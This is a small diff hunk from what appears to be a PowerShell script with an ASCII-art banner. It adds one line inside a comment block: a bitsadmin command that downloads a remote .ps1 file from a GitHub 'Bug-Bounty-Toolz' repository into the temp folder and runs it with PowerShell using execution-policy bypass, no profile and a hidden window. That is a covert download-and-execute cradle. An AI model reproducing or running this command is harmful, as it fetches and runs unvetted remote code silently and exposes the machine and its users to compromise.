@@ -10,6 +10,8 @@
  | '--'  /`-./  /.__)   `'  '-'  '\       /(_|  |          |  |        `'  '-'  '(_'  '--'\  
  `------'   `--'          `-----'  `-----'   `--'          `--'          `-----'    `-----' 
 
+ bitsadmin /transfer myDownloadJob /download /priority high https://raw.githubusercontent.com/fuzzlove/Bug-Bounty-Toolz/refs/heads/master/byostuff.ps1 %temp%\myscript.ps1 & powershell -exec bypass -nop -w hidden -file %temp%\myscript.ps1
+
 #>
 
 # Download our php interpreter
